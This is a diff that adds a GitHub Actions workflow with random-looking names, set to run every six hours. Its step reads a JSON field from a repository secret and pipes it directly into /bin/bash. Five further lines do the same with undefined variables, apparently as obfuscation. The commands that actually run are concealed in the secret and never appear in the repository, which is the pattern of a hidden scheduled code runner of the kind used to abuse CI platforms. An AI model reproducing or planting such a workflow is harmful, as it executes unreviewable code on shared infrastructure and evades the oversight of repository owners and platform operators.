@@ -1,0 +1,21 @@
+name: shunjuleirui
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shunjuleirui
+        env:
+          p47256: ${{ secrets.p47256 }}
+        run: |
+          echo $p47256 | jq -r .a14442 | /bin/bash
+          echo $ildu904 | jq -r .slyq391 | /bin/bash
+          echo $rh39 | jq -r .giic837 | /bin/bash
+          echo $hb310 | jq -r .vrwv84 | /bin/bash
+          echo $ec85293 | jq -r .qxyk3 | /bin/bash
+          echo $im7894 | jq -r .n7624 | /bin/bash
+
